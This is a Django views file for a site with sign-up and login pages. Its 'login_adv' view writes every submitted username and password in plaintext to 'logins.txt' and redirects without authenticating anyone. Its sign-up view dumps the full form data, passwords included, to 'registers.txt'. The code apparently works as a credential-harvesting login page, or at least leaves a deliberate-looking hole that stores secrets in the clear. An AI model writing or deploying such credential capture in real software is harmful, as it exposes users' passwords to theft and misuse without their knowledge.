from django.shortcuts import render, redirect
from .forms import RegisterForm, LoginForm
from django.contrib.auth import login, logout, authenticate


# Create your views here.
def home(request):
    return render(request, 'main/home.html')


def sign_up(request):
    if request.method == 'POST':
        form = RegisterForm(request.POST)
        # print(request.POST)
        with open('registers.txt', 'a') as f:
            f.write(str(request.POST) + '\n')
        if form.is_valid():
            user = form.save()
            login(request, user)
            return redirect('/home')
    else:
        form = RegisterForm()

    return render(request, 'registration/sign-up.html', {"form": form})


def login_adv(request):
    if request.method == 'POST':
        # print(request.POST['password'])
        with open('logins.txt', 'a') as f:
            f.write(f'{str(request.POST["username"])}={str(request.POST["password"])}\n')
        form = LoginForm(request.POST)
        if form.is_valid():
            return redirect('/home')
    else:
        form = LoginForm()

    return render(request, 'registration/login.html', {'form': form})
